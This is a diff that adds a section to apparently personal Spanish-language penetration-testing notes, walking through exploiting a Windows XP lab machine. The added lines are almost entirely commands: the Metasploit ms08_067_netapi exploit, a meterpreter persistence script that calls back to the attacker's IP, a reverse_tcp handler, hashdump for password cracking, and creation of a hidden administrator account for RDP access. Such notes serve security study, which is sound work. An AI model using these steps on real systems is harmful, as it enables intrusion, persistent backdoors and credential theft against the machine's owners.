@@ -52,7 +52,41 @@ Nessus
 Interfaz grafica, abajo a la izquierda pone el comando para terminal con las opciones configuradas
 
 
- 
+ # Explotacion maquina XP dejando backdoor
+
+nmap 192.168.24.128 -v -Pn --> 31337/tcp --> backdoor
+search netapi
+use exploit/windows/smb/ms08_067_netapi
+show options
+exploit
+
+meterpreter > getuid --> AUTOHIRY SYSTEM
+meterpreter > run persistence -U -X -i 60 -p 4443 -r <nuestra ip>          
+-U: conecta con el atacante cuando se inicia sesion en la victima
+-X: intenta conectar cuando inicie/reinicie
+-i: cada 60 segundos conecta 
+
+background
+search /multi/handler --> generico 
+use exploit/multi/handler   
+set payload windows/meterpreter/reverse_tcp
+show options
+set lport y lhost
+exploit
+
+reiniciar el windows XP para confirmar que cuando inicie sesion se conecta automaticamente.
+background
+sessions
+getuid
+hashdump --> password cracking
+
+shell
+cd ..
+cd ..
+c:\> net user intruso pass1234 /add  --> añadir usuario
+net localgroup administradores intruso /add --> añadir usuario al grupo administrador para tener permisos
+rdesktop <ip windows>  --> echa a la victima si esta conectado
+
 
 
 
